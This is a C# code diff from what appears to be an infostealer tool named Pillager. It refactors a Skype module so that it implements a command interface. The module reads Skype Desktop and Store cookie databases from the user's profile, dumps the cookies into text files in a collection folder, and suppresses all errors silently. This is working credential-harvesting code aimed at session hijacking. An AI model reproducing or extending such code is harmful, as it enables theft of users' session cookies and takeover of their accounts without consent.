@@ -5,11 +5,9 @@ using System.Text;
 
 namespace Pillager.Messengers
 {
-    internal class Skype
+    internal class Skype : ICommand
     {
-        public static string MessengerName = "Skype";
-
-        public static string[] MessengerPaths = new string[]
+        public string[] MessengerPaths = new string[]
         {
             Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                 "Microsoft\\Skype for Desktop"),
@@ -17,7 +15,7 @@ namespace Pillager.Messengers
                 "Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalCache\\Roaming\\Microsoft\\Skype for Store")
         };
 
-        public static string Skype_cookies(string MessengerPath)
+        public string Skype_cookies(string MessengerPath)
         {
             StringBuilder cookies = new StringBuilder();
             string skype_cookies_path = Path.Combine(MessengerPath, "Network\\Cookies");
@@ -50,7 +48,7 @@ namespace Pillager.Messengers
             return cookies.ToString();
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
@@ -58,10 +56,10 @@ namespace Pillager.Messengers
                 string Desktop = Skype_cookies(MessengerPaths[0]);
                 string Store = Skype_cookies(MessengerPaths[1]);
                 if (string.IsNullOrEmpty(Desktop) && string.IsNullOrEmpty(Store)) return;
-                string savepath = Path.Combine(path, MessengerName);
+                string savepath = Path.Combine(path, "Skype");
                 Directory.CreateDirectory(savepath);
-                if (!String.IsNullOrEmpty(Desktop)) File.WriteAllText(Path.Combine(savepath, MessengerName + "_Desktop.txt"), Desktop);
-                if (!String.IsNullOrEmpty(Store)) File.WriteAllText(Path.Combine(savepath, MessengerName + "_Store.txt"), Store);
+                if (!String.IsNullOrEmpty(Desktop)) File.WriteAllText(Path.Combine(savepath, "Skype_Desktop.txt"), Desktop, Encoding.UTF8);
+                if (!String.IsNullOrEmpty(Store)) File.WriteAllText(Path.Combine(savepath, "Skype_Store.txt"), Store, Encoding.UTF8);
             }
             catch { }
         }
